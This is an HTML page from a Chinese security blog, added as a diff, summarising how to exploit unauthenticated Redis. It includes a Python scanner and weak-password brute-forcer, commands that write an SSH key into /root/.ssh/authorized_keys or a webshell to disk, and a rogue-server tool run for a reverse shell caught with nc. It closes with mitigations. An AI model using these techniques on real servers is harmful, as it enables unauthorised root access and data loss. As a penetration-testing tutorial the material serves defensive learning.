@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="Littlebin404 Blog">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="https://littlebin404.github.io/img/main.jpg">
+    <meta property="twitter:image" content="https://littlebin404.github.io/img/main.jpg" />
+    
+
+    
+    <meta name="title" content="Redis未授权访问利用小结" />
+    <meta property="og:title" content="Redis未授权访问利用小结" />
+    <meta property="twitter:title" content="Redis未授权访问利用小结" />
+    
+
+    
+    <meta name="description" content="">
+    <meta property="og:description" content="" />
+    <meta property="twitter:description" content="" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>Redis未授权访问利用小结-littlebin404&#39;s Blog</title>
+
+    <link rel="canonical" href="/2020/01/27/Redis-RCE/">
+
+    <link rel="stylesheet" href="/css/iDisqus.min.css"/>
+	
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    
+    <link rel="stylesheet" href="/css/syntax.css">
+    
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+    
+    
+    
+	<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    
+    
+
+    
+    
+    <script src="/js/jquery.min.js"></script>
+    
+    
+    <script src="/js/bootstrap.min.js"></script>
+    
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    
+	
+	
+<style>
+#github svg {
+	transition: all 1s;
+	fill: #222;
+	color: #fff;
+	position: absolute;
+	top: 0;
+	right: 0;
+	border: 0;
+	width: 80px;
+	height: 80px;
+}
+#github:hover svg {
+	width: 160px;
+	height: 160px;
+}
+</style>
+</head>
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Littlebin404 Blog</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">主页</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/waf-bypass">waf-bypass</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">代码审计</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8">渗透神器</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">漏洞复现</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/top/about/">whoami</a></li>
+                    
+
+                    
+		    <li>
+                        <a href="/search">SEARCH <img src="/img/search.png" height="15" style="cursor: pointer;" alt="Search"></a>
+		    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/main.jpg')
+    }
+</style>
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/redis" title="Redis">
+                            Redis
+                        </a>
+                        
+                    </div>
+                    <h1>Redis未授权访问利用小结</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by 
+                        
+                            littlebin404
+                         
+                        on 
+                        Monday, January 27, 2020
+                        
+                        
+                        
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-11 col-lg-offset-1
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <header>
+                    <h2>目录</h2>
+                </header>
+                <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#漏洞危害">漏洞危害</a></li>
+        <li><a href="#未授权利用">未授权利用</a></li>
+        <li><a href="#未授权访问测试">未授权访问测试</a></li>
+        <li><a href="#漏洞利用复现">漏洞利用复现</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                
+                <blockquote>
+<p>“Redis未授权漏洞之利用小结”</p>
+</blockquote>
+<h2 id="漏洞危害">漏洞危害</h2>
+<blockquote>
+<p>（1）攻击者无需认证访问到内部数据，可能导致敏感信息泄露，也可以恶意执行flushall来清空所有数据；</p>
+</blockquote>
+<blockquote>
+<p>（2）攻击者可通过EVAL执行代码，或通过数据备份功能往磁盘写入后门文件；</p>
+</blockquote>
+<blockquote>
+<p>（3）最严重的情况，如果Redis以root身份运行，攻击者可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器；</p>
+</blockquote>
+<h2 id="未授权利用">未授权利用</h2>
+<blockquote>
+<p>1.利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
+</blockquote>
+<blockquote>
+<p>2.在redis以root权限运行时可以写crontab来执行命令反弹shell;</p>
+</blockquote>
+<blockquote>
+<p>3.往web物理路径写webshell;</p>
+</blockquote>
+<h2 id="未授权访问测试">未授权访问测试</h2>
+<p><strong>编写脚本</strong></p>
+<pre><code>#! /usr/bin/env python
+# _*_  coding:utf-8 _*_
+import socket
+import sys
+PASSWORD_DIC=['redis','root','oracle','password','p@aaw0rd','abc123!','123456','admin']
+def check(ip, port, timeout):
+    try:
+        socket.setdefaulttimeout(timeout)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip, int(port)))
+        s.send(&quot;INFO\r\n&quot;)
+        result = s.recv(1024)
+        if &quot;redis_version&quot; in result:
+            return u&quot;未授权访问&quot;
+        elif &quot;Authentication&quot; in result:
+            for pass_ in PASSWORD_DIC:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((ip, int(port)))
+                s.send(&quot;AUTH %s\r\n&quot; %(pass_))
+                result = s.recv(1024)
+                if '+OK' in result:
+                    return u&quot;存在弱口令，密码：%s&quot; % (pass_)
+    except Exception, e:
+        pass
+if __name__ == '__main__':
+    ip=sys.argv[1]
+    port=sys.argv[2]
+    print check(ip,port, timeout=10)
+</code></pre><p><strong>脚本运行结果</strong>
+<img src="/img/r1.jpg" alt="screenshot"></p>
+<p><strong>验证</strong></p>
+<p>从登录的结果可以看出该redis服务对公网开放，且未启用认证。
+<img src="/img/r2.jpg" alt="screenshot"></p>
+<h2 id="漏洞利用复现">漏洞利用复现</h2>
+<h3 id="利用redis写webshell">利用redis写webshell</h3>
+<p>当redis权限不是root时，并开着web服务，在redis有web目录写权限时，可以尝试往web物理路径写webshell；存在<strong>ssrf</strong>漏洞的站点可以利用四个协议，分别是http、file、gopher（redis以root权限运行）、dict（一条一条的执行）协议。
+<img src="/img/r14.jpg" alt="screenshot"></p>
+<p>使用浏览器访问redis-shell.php,验证是否写入成功:
+<img src="/img/r15.jpg" alt="screenshot"></p>
+<h3 id="利用公私钥认证获取root权限">利用公私钥认证获取root权限</h3>
+<p>执行mkdir /root/.ssh命令，创建ssh公钥存放目录；生成ssh公钥和私钥，密码设置为空：
+<img src="/img/r6.jpg" alt="screenshot"></p>
+<p>进入.ssh目录：cd .ssh/，将生成的公钥保存到1.txt：（<strong>前后用\n换行，避免和Redis里其他缓存数据混合</strong>）</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-toml" data-lang="toml"> (echo -e <span style="color:#f1fa8c">&#34;\n\n&#34;</span>; cat id_rsa.pub; echo -e <span style="color:#f1fa8c">&#34;\n\n&#34;</span>) &gt; <span style="color:#bd93f9">1</span>.txt
+</code></pre></div><p>将1.txt写入redis:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-toml" data-lang="toml">cat <span style="color:#bd93f9">1</span>.txt | redis-cli -h <span style="color:#bd93f9">192.168</span>.<span style="color:#bd93f9">114.128</span> -x set crack 
+</code></pre></div><p>登录靶机的redis服务，使用config get dir命令得到redis备份的路径：
+<img src="/img/r9.jpg" alt="screenshot"></p>
+<p>更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）：
+<img src="/img/r10.jpg" alt="screenshot"></p>
+<p>设置上传公钥的备份文件名字为authorized_keys：
+<img src="/img/r11.jpg" alt="screenshot"></p>
+<p>检查是否更改成功（查看有没有authorized_keys文件），没有问题就保存然后退出，至此成功写入ssh公钥到靶机：
+<img src="/img/r12.jpg" alt="screenshot"></p>
+<p>在攻击机使用ssh免密登录主机A：ssh -i id_rsa <a href="mailto:root@192.168.114.128">root@192.168.114.128</a>，成功登录：
+<img src="/img/r13.jpg" alt="screenshot"></p>
+<h3 id="自动化rce脚本">自动化RCE脚本</h3>
+<p>github地址：(<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a>)
+<img src="/img/r3.jpg" alt="screenshot"></p>
+<p>执行脚本：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-toml" data-lang="toml">python3 redis-rogue-server.py --rhost <span style="color:#bd93f9">192.168</span>.<span style="color:#bd93f9">21.130</span> --lhost <span style="color:#bd93f9">192.168</span>.<span style="color:#bd93f9">21.34</span>
+</code></pre></div><p>分为Interactive shell和 Reverse shell，输入选项i，运行whoami：</p>
+<p><img src="/img/r4.jpg" alt="screenshot"></p>
+<p>输入选项r，用nc监听返回的shell：
+<img src="/img/r5.jpg" alt="screenshot"></p>
+<h3 id="解决方案">解决方案</h3>
+<p>1、比较安全的办法是采用redis.conf文件绑定IP的方式来进行控制：</p>
+<pre><code># If you want you can bind a single interface, if the bind option is not
+# specified all the interfaces will listen for incoming connections.
+# bind 127.0.0.1
+</code></pre><p>把# bind 127.0.0.1前面的注释#号去掉，把127.0.0.1改成你允许访问的ip地址，启动redis服务器的时候只能用: redis-server /etc/redis.conf,缺点为难免有多台机器访问一个redis服务。</p>
+<p>2、设置密码，以提供远程登陆
+打开redis.conf配置文件，找到requirepass，然后修改如下:
+<img src="/img/r16.jpg" alt="screenshot"></p>
+<p>报错如下：
+<img src="/img/r17.jpg" alt="screenshot"></p>
+<p>这时候用授权命令进行授权，就可以访问redis了：
+<img src="/img/r18.jpg" alt="screenshot"></p>
+
+
+                
+
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="next">
+                        <a href="/2020/01/20/burtsuit%e6%8f%92%e4%bb%b6%e4%b9%8bburpFakeIP%e7%bb%95%e8%bf%87cc%e9%98%b2%e6%8a%a4/" data-toggle="tooltip" data-placement="top" title="burtsuit插件之burpFakeIP绕过cc防护">
+                            下一篇&rarr;</a>
+                    </li>
+                    
+                    
+                    <li class="previous">
+                        <a href="/2020/02/24/cve-2020-1938-apache-tomcat/" data-toggle="tooltip" data-placement="top" title="CVE-2020-1938 Apache Tomcat 文件读取文件包含漏洞">&larr;上一篇 </a>
+                    </li>
+                    
+                </ul>
+
+                
+<div id="disqus-comment"></div>
+
+
+
+            </div>
+            
+            <div class="
+                col-lg-11 col-lg-offset-1
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">标签</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        <a href="/tags/burpsuit" title="burpsuit">
+                            burpsuit
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/finecms" title="finecms">
+                            finecms
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/redis" title="redis">
+                            redis
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/safedog" title="safedog">
+                            safedog
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/tomcat" title="tomcat">
+                            tomcat
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/xml%E6%B3%A8%E5%85%A5" title="xml注入">
+                            xml注入
+                        </a>
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+                <section>
+                    <hr>
+                    <h5>友链</h5>
+                    <ul class="list-inline">
+                        
+                        <li><a target="_blank" href="https://www.jianshu.com/u/990ca34c32dd">简书</a></li>
+                        
+                    </ul>
+                </section>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <script src="/js/autoload.js"></script>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                   
+                    
+                    <li>
+                        <a href="mailto:littlebin404@163.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		    
+                    
+                    
+                    
+                    
+
+                    
+
+		    
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/littlebin404">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+                </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; Littlebin404 Blog 2020
+                    
+                    
+                    
+                        
+                        
+                        
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        async("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    async("/bn/fastclick.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+</body>
+</html>
